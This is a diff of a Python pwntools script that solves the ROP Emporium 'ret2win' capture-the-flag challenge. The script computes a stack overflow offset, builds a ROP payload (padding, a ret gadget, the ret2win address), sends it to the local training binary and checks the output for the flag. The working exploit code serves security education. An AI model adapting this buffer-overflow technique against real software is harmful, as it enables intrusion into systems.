@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-# ROP Emporium - ret2win32 solution using pwntools library
+# ROP Emporium - ret2win solution using pwntools library
 # Link: https://ropemporium.com/challenge/ret2win.html
 # Created by dilldylanpickle on 4-2-2023
 # GitHub: https://github.com/dilldylanpickle
@@ -11,70 +11,88 @@
 #   - ROPgadget (https://github.com/JonathanSalwan/ROPgadget)
 
 import os           # Provides a way of using operating system dependent functionalities
+import re           # Allows pattern matching and text processing through regex
 from pwn import *   # Import Python3 library for accessing operating system functionality
 
 def exploit(binary_path):
 
     # Create an ELF object and start a new process
     elf = context.binary = ELF(binary_path)
-    io = process(elf.path)
 
-    # Load the cached gadgets for the binary
-    rop = ROP(elf)
+    # Set log level to debug if debugging is needed
+    context.log_level = 'debug'
 
-    # Get the address of the ret2win function
-    ret2win_addr = elf.symbols["ret2win"]
-    print("[DEBUG] The address of ret2win() is " + str(hex(ret2win_addr)))
+    # Automatically close the process when the "with" block is exited
+    with process(elf.path) as io:
 
-    # Use ROPgadget to find the address of a "ret" instruction
-    ret = rop.find_gadget(['ret'])[0]
-    print("[DEBUG] The address of ROP gadget ret is " + str(hex(ret)))
+        # Load the cached gadgets for the binary
+        rop = ROP(elf)
 
-    # Get the offset by calling the find_offset function
-    offset = find_offset(binary_path)
-    print("[DEBUG] The offset calculated overwrite RIP is " + str(offset) + " bytes")
+        # Get the address of the ret2win function
+        ret2win_addr = elf.symbols["ret2win"]
+        log.debug(f"The address of ret2win() is {hex(ret2win_addr)}")
 
-    # Construct the payload
-    payload = b'A' * offset
-    payload += p64(ret)
-    payload += p64(ret2win_addr)
-    print("[DEBUG] The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
+        # Use ROPgadget to find the address of a "ret" instruction
+        ret = rop.find_gadget(['ret'])[0]
+        print("[DEBUG] The address of ROP gadget ret is " + str(hex(ret)))
 
-    # Send the payload and print the output
-    io.sendline(payload)
-    log.info(io.clean())
-    log.success('(SUCCESS) The flag has been sucessfully captured!')
+        # Get the offset by calling the find_offset function
+        offset = find_offset(binary_path)
+        log.debug(f"The offset calculated to overwrite RIP is {offset} bytes")
 
-    # Close the process
-    io.close()
+        # Construct the payload
+        payload = b'i' * offset
+        payload += p64(ret)
+        payload += p64(ret2win_addr)
+        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
+
+        # Send the payload and print the output
+        io.sendline(payload)
+        output = io.clean().decode()
+        log.info(output)
+
+        # Use regular expression to search for the flag pattern
+        flag_pattern = r'ROPE{[^}]+}'
+        match = re.search(flag_pattern, output)
+
+        # Verify if the ROP exploit was successful in capturing the flag 
+        if match:
+            flag = match.group(0)
+            log.success(f"(SUCESS) The flag {flag} has been successfully captured!")
+        else:
+            log.failure("(FAILURE) You failed to capture the flag. Try a new payload!")
 
 def find_offset(binary_path):
+
+    # Save the original log level which would be either 'info' or 'debug'
+    log_level = context.log_level
 
     # Disable logging for offset calculations
     context.log_level = 'error'
 
     # Create an ELF object and start a new process
     elf = context.binary = ELF(binary_path)
-    io = process(elf.path)
+    
+    # Automatically close the process when the "with" block is exited
+    with process(elf.path) as io:
 
-    # Send a cyclic pattern as input to the binary
-    pattern = cyclic(69)
-    io.sendline(pattern)
-    io.wait()           
+        # Send a cyclic pattern as input to the binary
+        pattern = cyclic(69)
+        io.sendline(pattern)
+        io.wait()           
 
-    # Get the corefile to extract the value of the instruction pointer (eip)
-    core = io.corefile
-    rip = core.rip
+        # Get the corefile to extract the value of the instruction pointer (eip)
+        core = io.corefile
+        rip = core.rip
 
-    # Find the offset by searching for the cyclic pattern in the eip value
-    offset = cyclic_find(core.read(core.rsp, 4))
+        # Find the offset by searching for the cyclic pattern in the eip value
+        offset = cyclic_find(core.read(core.rsp, 4))
 
-    # Close the process that calculated the offset
-    io.close()
 
-    # Enable log level and output a result
-    context.log_level = 'info'
+        # Revert the log level to the original value
+        context.log_level = log_level
 
+    # Return the calculated offset to overwrite the instruction pointer
     return offset
 
 if __name__ == '__main__':
